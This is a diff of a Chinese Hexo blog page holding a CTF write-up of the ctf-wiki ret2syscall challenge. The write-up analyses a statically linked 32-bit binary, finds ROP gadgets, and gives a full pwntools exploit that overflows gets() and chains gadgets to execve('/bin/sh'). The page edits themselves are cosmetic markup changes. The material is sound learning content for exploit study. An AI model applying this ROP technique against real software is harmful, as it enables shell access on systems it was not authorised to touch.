@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -151,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T2-ret2syscall"><span class="nav-text">T2 ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05"><span class="nav-text">0x05</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T2 ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x05</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">Reference</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -177,7 +179,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -369,19 +371,19 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T2-ret2syscall"><a href="#T2-ret2syscall" class="headerlink" title="T2 ret2syscall"></a>T2 ret2syscall</h2><blockquote>
+        <h2><span id="t2-ret2syscall">T2 ret2syscall</span></h2><blockquote>
 <p>2023-01-22WP<br>ctf-wiki 基础rop<br>考点：ret2syscall</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">题目链接</a></p>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开启NX保护，堆栈不可执行<br>而且注意这是statically linked（静态链接），不能通过泄露库函数地址获取system函数地址</p>
+<h3><span id="0x01">0x01</span></h3><p>file checksec —— 32-bit 开启NX保护，堆栈不可执行<br>而且注意这是statically linked（静态链接），不能通过泄露库函数地址获取system函数地址</p>
 <p><img data-src="https://pic3.zhimg.com/80/v2-ce9f573c1ee908c7343b45691c74ce8e_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，发现没有system函数可用<br>有gets函数，应该是通过它实现栈溢出</p>
+<h3><span id="0x02">0x02</span></h3><p>IDA看源码，发现没有system函数可用<br>有gets函数，应该是通过它实现栈溢出</p>
 <p><img data-src="https://pic1.zhimg.com/80/v2-5cc70f310e93e5c4fb3262ff9297fb44_1440w.webp"></p>
 <p>由0x01可知我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。</p>
 <p>也就是我们只需要把各个参数放在对应的寄存器中，执行int 0x80 就可实现对系统的调用</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>利用系统调用来获取shell</p>
+<h3><span id="0x03">0x03</span></h3><p>利用系统调用来获取shell</p>
 <blockquote>
 <p>execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</p>
 </blockquote>
@@ -410,10 +412,10 @@
 <p><img data-src="https://pic4.zhimg.com/80/v2-6141708a6cddca7ad9fd374297af1fe3_1440w.webp"></p>
 <p>还有int 0x80的地址  0x08049421 </p>
 <p><img data-src="https://pic4.zhimg.com/80/v2-ff0f310e66188f0ab84f3f516e986ee7_1440w.webp"></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以写exp了</p>
+<h3><span id="0x04">0x04</span></h3><p>可以写exp了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./rop&quot;)</span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line"></span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">#偏移量的计算方法和ret2text的相同</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>补充一些系统调用的相关知识</p>
+<h3><span id="0x05">0x05</span></h3><p>补充一些系统调用的相关知识</p>
 <p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h 和 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。</p>
 <p>操作系统实现系统调用的基本过程是：</p>
 <ol>
@@ -432,7 +434,7 @@
 </ol>
 <p>Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX</p>
 <p>更多系统调用号可参考    参考文章</p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>参考文章：</p>
+<h3><span id="reference">Reference</span></h3><p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44864859/article/details/106213446">ret2syscall知识点及例题</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33769475/article/details/121953414#:~:text=%E6%AD%A4%E6%AC%A1%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E8%87%AA%E5%B7%B1%E5%A1%AB%E5%86%99%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%8E%B7%E5%BE%97%20shell%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%20gadgets%20%E6%9D%A5%E8%8E%B7%E5%BE%97,shell%EF%BC%8C%E8%80%8C%E5%AF%B9%E5%BA%94%E7%9A%84%20shell%20%E8%8E%B7%E5%8F%96%E5%88%99%E6%98%AF%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%82%20%E9%87%87%E5%8F%96%E4%BD%BF%E7%94%A8ret2syscall%E5%8D%B3%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%8C%E8%8E%B7%E5%8F%96%20shell%E3%80%82">ret2syscall</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>
 
     </div>
@@ -641,13 +643,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
